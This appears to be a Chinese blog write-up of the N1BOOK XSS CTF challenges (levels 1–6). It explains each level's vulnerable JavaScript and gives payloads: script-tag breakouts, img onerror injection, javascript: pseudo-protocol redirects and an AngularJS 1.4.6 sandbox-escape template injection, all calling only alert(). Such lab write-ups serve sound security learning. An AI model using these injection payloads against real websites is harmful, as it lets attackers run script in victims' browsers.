---
title: N1BOOK of web XSS闯关 writeup
date: 2022-04-13 14:07:00
updated: 2022-04-13 16:04:00
tags: [ctf,security,<<从0到1：CTFer成长之路>]
description: <<从0到1：CTFer成长之路>>配套题目 web相关题目的做题记录 N1BOOK of web 死亡ping命令 writeupcahttps://blog.csdn.net/qq_45414878/article/details/109672659
---

## Level 1

```
/level1?username=<script>alert()<script>
```

最简单的反射型xss 在url传参中做利用。

官方wp中给出的`/level1?username=xss%3Csvg/onload=alert()`看不懂而且我也没法用这个payload打通...挺迷的，大概意思应该是插入一个svg，然后在svg里面写个onload事件触发alert吧。

## Level 2

还是先尝试一下最简单的xss，发现不行，然后查看一下源码

```javascript

    	if(location.search == ""){
    		location.search = "?username=xss"
    	}
    	var username = 'xss';
    	document.getElementById('ccc').innerHTML= "Welcome " + escape(username);
    
```

传入的username参数被escape函数编码了，escape() 函数可对字符串进行编码，这样就可以在所有的计算机上读取该字符串。 该方法不会对ASCII 字母和数字进行编码，也不会对下面这些ASCII 标点符号进行编码： * @ - _ + . / 。 其他所有的字符都会被转义序列替换。

escape把字符串编码后，那就不会把传入内容直接当js执行了，所以说之前的办法行不通，但是不代表不能XSS，这里漏洞产生的原因是username这个js中的变量受用户直接控制且只有escape这个编码过滤，我们传入`?username=';</script><script>alert()</script>//`，这样js会执行

```javascript
<script type="text/javascript">
var username = '';</script><script>alert()</script>//';
</script>
```

先用一个引号闭合username，然后再用一个`</script>`和前面的`<script>`闭合，后面插入script标签就可以执行任意js函数了。

官方解法是`?username='-alert()`，其实差不多的解法，但是不太懂`-`是什么意思，不过把`-`换成`;`后也可以打通。

## Level 3

```js

    	if(location.search == ""){
    		location.search = "?username=xss"
    	}
    	var username = 'xss';
    	document.getElementById('ccc').innerHTML= "Welcome " + username;
    
```

这里把escape取消了其他啥也没变？？

我用我自己Level 2中的payload也可以成功打通，但是level 2官方的payload在level 3中不适用，这个没搞懂为啥。

因为把escape取消了所以下面innerHTML中的拼接也有了可以利用的地方，这里可以插入一些html中的标签来达成xss的效果。

官方wp中插入了img标签，学习一下他的做法，`?username=xss<img src=x onerror=alert()>`其实是一种利用img标签的onerror属性进行xss的常见做法。

onerror是一个js事件，当图片不存在时会触发，所以只要src属性找不到对应图片，写在onerror中的js语句就可以得以执行。

## Level 4

```js

    	var time = 10;
    	var jumpUrl;
    	if(getQueryVariable('jumpUrl') == false){
    		jumpUrl = location.href;
    	}else{
    		jumpUrl = getQueryVariable('jumpUrl');
    	}
    	setTimeout(jump,1000,time);
    	function jump(time){
    		if(time == 0){
    			location.href = jumpUrl;
    		}else{
    			time = time - 1 ;
    			document.getElementById('ccc').innerHTML= `页面${time}秒后将会重定向到${escape(jumpUrl)}`;
    			setTimeout(jump,1000,time);
    		}
    	}
		function getQueryVariable(variable)
		{
		       var query = window.location.search.substring(1);
		       var vars = query.split("&");
		       for (var i=0;i<vars.length;i++) {
		               var pair = vars[i].split("=");
		               if(pair[0] == variable){return pair[1];}
		       }
		       return(false);
		}
    
```

这里也比较明显，接收jumpUrl参数，并且将参数拼接进innerHTML，导致xss注入

但是这里jumpUrl有escape字符串编码再拼接进去，所以这里的利用需要使用javascript伪协议来执行，由于这里有url跳转，传入参数会被拼在url里面，在浏览器打开javascript：URL的时候，它会先运行URL中的代码，当返回值不为undefined的时候，前页链接会替换为这段代码的返回值，payload：`?jumpUrl=javascript:alert()`

## Level 5

```js

    	if(getQueryVariable('autosubmit') !== false){
    		var autoForm = document.getElementById('autoForm');
    		autoForm.action = (getQueryVariable('action') == false) ? location.href : getQueryVariable('action');
    		autoForm.submit();
    	}else{
    		
    	}
		function getQueryVariable(variable)
		{
		       var query = window.location.search.substring(1);
		       var vars = query.split("&");
		       for (var i=0;i<vars.length;i++) {
		               var pair = vars[i].split("=");
		               if(pair[0] == variable){return pair[1];}
		       }
		       return(false);
		}
    
```

发现代码首先接收get请求参数autosubmit，如果不是false就继续执行，然后接收get请求参数action，如果接收到action参数就读action参数并且提交表单，利用javascript伪协议可以在提交的表单中执行任意js代码。

payload：`?action=javascript:alert()&autosubmit=1`

## Level 6

>参考：
>
>https://juejin.cn/post/6891628594725847047
>
>http://www.mdlabs.cn/index.php/2022/04/01/buuctf-n1book-xss%E9%97%AF%E5%85%B31-%E3%80%90xss%E5%B0%8F%E7%BB%93%E3%80%91/

这个题目比较复杂，首先是源代码里面直接看js是看不出来什么的，这里要利用Angular.js的模板注入来逃逸沙箱，达成XSS漏洞的利用。

先判断存在angular模板注入

![image-20220413155408133](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220413155408133.png)

![image-20220413155324232](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220413155324232.png)

只从做题的角度来看的话，找一下angular 1.4.6的payload，直接就打通了

从https://juejin.cn/post/6891628594725847047#heading-8中，payload

```
?username={{x={y:''.constructor.prototype}; x.y.charAt=[].join; [1]|orderBy:'x=alert(1)}}'
```

直接打通，flag到手啦

然后我们来研究一下AngularJS的模板注入，主要看这篇文章https://juejin.cn/post/6891628594725847047#heading-8

真看不懂....麻了，找个时间认真研究一下吧



